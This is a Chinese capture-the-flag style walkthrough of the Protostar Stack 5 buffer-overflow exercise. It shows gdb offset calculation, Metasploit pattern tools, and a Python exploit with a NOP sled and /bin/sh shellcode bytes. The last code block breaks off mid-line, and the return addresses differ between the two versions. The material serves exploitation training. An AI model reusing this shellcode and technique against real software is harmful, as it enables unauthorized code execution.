# Stack 5

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

int main\(int argc, char \*\*argv\)

{

char buffer\[64\];

gets\(buffer\);

}

## （二）解题过程：

gdb 调试 stack5程序，在ret函数上下断点。

b 16

r

输入aaaaaaaaa

i r

print $esp

print $ebp

查看此时的内存布局 ，找到buff 和 ret的距离就可以计算出需要填充多少字节，恰好覆盖到ret地址，返回地址后面是argc argv

esp    buffer开始         buffer结束（ebp  ret\)   argc argv

esp                    esp+0x10        ebp                 ret                   argc              argv

0xbffffcd0     0xbffffce0      0xbffffd28    0xbffffd2c   0x00000001   0xbffffdd4

![](/png/15.png)

如图所示：构造payload

buff\[0\]+ 0x4c+ 返回地址+ shellcode

exploit

python -c "print 'a'\*76+'\x30\xfc\xff\xbf'+'\x90'\*20+shellcode

import struct

pad = "\x41" \* 76

EIP = struct.pack\("I", 0xbffffd30\)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

NOP = "\x90" \* 100

print pad + EIP + NOP + shellcode

![](/png/10.png)

![](/png/16.png)

方法2：快速定位漏洞触发的位置并写出exploit

第一种方法是手工定位，计算填充的字节数和eip返回地址。下面这种 方法借助于定位脚本快速定位。

思路

1）判断是否存在漏洞，先给buffer填充100个a看看是否崩溃。

![](/png/18.png)

显然，出现了熟悉的段错误。通常，我们会调试.coredump的方法找到出错的位置。现在我们用最基础最快速的方法来定位。（调试dump）下一种方法给出。

2）用kali metasploit环境下的pattern\__create.rb脚本来生成要填充的标志性的字符串，再用pattern_\_offset来定位漏洞触发的位置。

![](/png/19.png)

3\)用生成的长度为100的字符串进行定位溢出点

![](/png/20.png)

程序在0x63413563处崩溃。用pattern\_offset.py定位溢出位置，找到距离buffer起始位置的偏移。

![](/png/21.png)

在偏移量76处，程序崩溃。这跟手工定位的位置是一样的。

![](/png/22.png)

4）若想用这个stack5二进制文件获取shell,需要确定这个二进制文件是否具有suid权限。可以用find命令实现。

![](/png/23.png)

小结：就是计算填充缓冲区的大小有两种方法：

第一种：手工 （利用gdb 定位eip地址---buff起始地址\(print $esp查看之后buff起始地址）

第二种：借助于metasploit模块里的脚本定位偏移量。

5）漏洞利用代码编写

技巧：利用NOP空操作模块可以确保漏洞利用代码不会失败。因为我们无法始终指向正确的地址，所以利用空指令来指向他们，直到shellcode入口位置。

76个a + eip\(覆盖为要跳转到的地址,可以是下一条指令的地址\) + NOP+shellcode

用python编写exploit.py

1\)导入struct模块

import struct

2\)填充字符a

pad='a'\*76

3\)接下来是漏洞触发 覆盖eip的地方，把eip地址覆盖成shellcode的入口地址，也可以是下一条要执行的指令的地址。原始eip的地址是0xbffffcbc，下一条指令的地址是0xbffffcbc

EIP = struct.pack\("I",

Ref：

[https://xz.aliyun.com/t/3908](https://xz.aliyun.com/t/3908)

[https://0xrick.github.io/binary-exploitation/bof5/](https://0xrick.github.io/binary-exploitation/bof5/)

